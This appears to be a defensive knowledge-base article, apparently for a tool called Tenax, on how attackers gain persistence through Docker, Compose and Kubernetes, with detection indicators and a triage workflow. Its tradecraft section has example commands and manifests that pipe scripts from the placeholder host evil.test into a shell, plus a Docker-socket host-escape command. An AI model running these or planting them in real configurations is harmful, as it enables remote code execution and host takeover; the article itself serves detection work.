# Container-Based Persistence

## Overview

Container-based persistence refers to the abuse of container runtimes and containerized workloads to establish execution that survives across sessions, deployments, or system activity.

Modern Linux environments frequently run container platforms such as:

- Docker  
- containerd  
- Podman  
- Kubernetes  

These platforms introduce new persistence surfaces that differ from traditional Linux mechanisms.

Rather than modifying:

- cron  
- systemd  
- init scripts  

attackers can persist by:

- creating or modifying containers  
- embedding malicious logic into container images  
- abusing container restart policies  
- hijacking orchestration configurations  

> **In container persistence, the container runtime becomes the execution engine.**

---

## Why Attackers Use Containers for Persistence

Attackers use container-based persistence because it provides:

- Execution abstracted from the host filesystem  
- Built-in restart and lifecycle management  
- Compatibility with cloud-native environments  
- Ability to blend into normal DevOps workflows  
- A persistence layer often ignored in host-based triage  

Container persistence is especially effective in:

- developer systems  
- CI/CD pipelines  
- cloud workloads  
- Kubernetes clusters  
- infrastructure-as-code environments  

---

## Execution Semantics

Container persistence relies on how container runtimes manage lifecycle and execution.

Key concepts:

- containers can be configured to **restart automatically**  
- containers can execute **entrypoint commands**  
- containers can be **recreated from images**  
- container definitions may be stored in:
  - local configs  
  - orchestration manifests  
  - remote registries  

Execution is often tied to:

- system boot  
- container runtime restart  
- orchestration reconciliation (e.g., Kubernetes)  

---

## Common Persistence Surfaces

### Docker

- running containers  
- container restart policies  
- Docker daemon configuration  
- Docker Compose files  

### containerd / Podman

- container definitions  
- systemd-managed containers  
- runtime configuration  

### Kubernetes

- Deployments  
- DaemonSets  
- CronJobs  
- Pods  

---

## Privilege Requirements

Container persistence can be established with:

### User-Level Access

- ability to run containers  
- access to Docker socket (`/var/run/docker.sock`)  

### Elevated Access

- root-level container creation  
- modification of runtime configuration  
- cluster-level access (Kubernetes)  

Important:

> Access to the Docker socket is effectively equivalent to root access on the host.

---

## Why This Mechanism Is So Effective

Container persistence is powerful because it:

- decouples execution from traditional OS mechanisms  
- survives system reboots via restart policies  
- blends into legitimate container workloads  
- may not appear in traditional persistence checks  

Unlike traditional persistence:
- it may not exist in `/etc`  
- it may not appear in cron or systemd  
- it may live entirely inside container definitions  

---

## Common Attacker Tradecraft

### 1. Container with Restart Policy for Persistence

Example:

```text
docker run -d --restart=always --name sys-update alpine sh -c "while true; do curl http://evil.test/p.sh | sh; sleep 600; done"
```

Execution flow:
1. Attacker creates container with restart policy  
2. Container runs malicious loop  
3. If container stops, runtime restarts it  
4. Payload executes continuously  

Why attackers use this:
- Built-in persistence via restart policy  
- No need for cron or systemd  
- Harder to detect in host-based triage  

---

### 2. Malicious Entrypoint in Container Image

Example Dockerfile:

```dockerfile
FROM ubuntu:latest
ENTRYPOINT ["/bin/bash", "-c", "curl http://evil.test/payload.sh | bash"]
```

Execution flow:
1. Attacker builds or modifies image  
2. Image is deployed or executed  
3. Entrypoint runs automatically  
4. Payload executes on container start  

Why attackers use this:
- Persistence embedded in image  
- Survives container recreation  
- Useful in CI/CD environments  

---

### 3. Docker Compose Backdoor Service

Example:

```yaml
version: "3"
services:
  web:
    image: nginx
  updater:
    image: alpine
    command: sh -c "curl http://evil.test/p.sh | sh"
    restart: always
```

Execution flow:
1. Attacker modifies Compose file  
2. Additional service is introduced  
3. Compose deployment runs services  
4. Malicious container executes persistently  

Why attackers use this:
- Blends into multi-service deployments  
- Easy to hide among legitimate services  
- Survives restarts and redeployments  

---

### 4. Kubernetes Deployment Backdoor

Example:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web
spec:
  template:
    spec:
      containers:
      - name: web
        image: nginx
      - name: helper
        image: alpine
        command: ["sh", "-c", "curl http://evil.test/p.sh | sh"]
```

Execution flow:
1. Attacker modifies deployment manifest  
2. Additional container is added  
3. Kubernetes reconciles desired state  
4. Malicious container runs automatically  

Why attackers use this:
- Persistence tied to orchestration  
- Automatically recreated if removed  
- Very difficult to eliminate without config cleanup  

---

### 5. Host Escape via Docker Socket Abuse

Example:

```text
docker -H unix:///var/run/docker.sock run -v /:/host alpine chroot /host sh
```

Execution flow:
1. Attacker accesses Docker socket  
2. Launches container with host filesystem mounted  
3. Gains control of host  
4. Installs persistence outside container  

Why attackers use this:
- Container → host pivot  
- Full system compromise  
- Enables traditional persistence after container access  

---

### 6. Hidden Long-Running Container

Example:

```text
docker run -d --name dbus-helper alpine sleep infinity
```

Followed by:

```text
docker exec dbus-helper sh -c "curl http://evil.test/p.sh | sh"
```

Execution flow:
1. Attacker creates benign-looking container  
2. Container runs indefinitely  
3. Attacker executes payload inside container  
4. Container serves as foothold  

Why attackers use this:
- Looks harmless  
- Maintains persistent execution environment  
- Avoids repeated container creation  

---

### 7. Cron Inside Container for Secondary Persistence

Example:

```dockerfile
RUN echo "* * * * * curl http://evil.test/p.sh | sh" >> /var/spool/cron/crontabs/root
```

Execution flow:
1. Attacker embeds cron inside container  
2. Container runs  
3. Cron executes payload repeatedly  
4. Persistence exists inside container context  

Why attackers use this:
- Persistence hidden inside container  
- Not visible in host cron  
- Adds layered execution  

---

### 8. DaemonSet Persistence in Kubernetes

Example:

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-helper
spec:
  template:
    spec:
      containers:
      - name: helper
        image: alpine
        command: ["sh", "-c", "curl http://evil.test/p.sh | sh"]
```

Execution flow:
1. Attacker deploys DaemonSet  
2. Container runs on every node  
3. Kubernetes ensures it stays running  
4. Payload executes cluster-wide  

Why attackers use this:
- Massive scale persistence  
- Auto-redeployment  
- Hard to fully remove  

---

## What Normal Looks Like

Legitimate container behavior typically includes:

- known images from trusted registries  
- expected services (web, database, API)  
- documented container definitions  
- controlled restart policies  

Normal characteristics:

- clear naming  
- expected ports and behavior  
- consistent deployment patterns  

---

## What Malicious Use Looks Like

### High-Signal Indicators

- containers running:
  - `curl`
  - `wget`
  - shell loops  
- unknown containers with restart policies  
- containers executing from:
  - `/tmp`
  - remote URLs  
- additional containers not in original deployment  

### Medium-Signal Indicators

- unusual container names  
- containers with minimal images (`alpine`, `busybox`) used suspiciously  
- containers running unexpected commands  

### Low-Signal Indicators

- legitimate sidecar containers  
- debugging containers  
- temporary development containers  

---

## ATT&CK Mapping

Relevant ATT&CK techniques include:

- **T1610 – Deploy Container**
- **T1611 – Escape to Host**
- **T1525 – Implant Container Image**

These techniques describe adversaries using containers for execution, persistence, and lateral movement.

---

## Why Analysts Miss This Technique

### 1. Focus on Host-Based Persistence

Analysts often inspect:
- cron  
- systemd  
- init  

Containers operate outside those surfaces.

### 2. Visibility Gaps

Container activity may not appear in:
- traditional logs  
- file system triage  

### 3. Assumption of Legitimacy

Containers are often assumed to be part of normal operations.

### 4. Complexity

Container environments introduce:
- multiple layers  
- orchestration systems  
- ephemeral workloads  

---

## Deep Analytical Guidance

### Key Question

> Is a container executing something that does not belong in the environment?

---

### Focus Areas

#### 1. Running Containers

```text
docker ps -a
```

#### 2. Container Commands

```text
docker inspect <container>
```

#### 3. Images

```text
docker images
```

#### 4. Restart Policies

Check for:
- `always`
- `unless-stopped`

#### 5. Orchestration Configs

- Docker Compose files  
- Kubernetes manifests  

---

## Triage Workflow

1. Enumerate containers  
2. Inspect commands and entrypoints  
3. Check restart policies  
4. Validate images and sources  
5. Correlate with network activity  
6. Investigate orchestration configs  

---

## Evidence to Preserve

- container definitions  
- images and hashes  
- runtime configuration  
- logs  
- orchestration manifests  
- network activity  

---

## Why Tenax Checks This Surface

Tenax checks container persistence because it represents:

- modern infrastructure abuse  
- hidden execution layers  
- high-impact persistence mechanisms  

This is especially important in:

- cloud environments  
- DevOps pipelines  
- containerized applications  

> Persistence is no longer just on the host — it lives inside the infrastructure that runs the host.

---

## Key Takeaway

Container-based persistence leverages runtime and orchestration systems to maintain execution.

> The attacker does not persist in the operating system — they persist in the platform that runs everything on top of it.
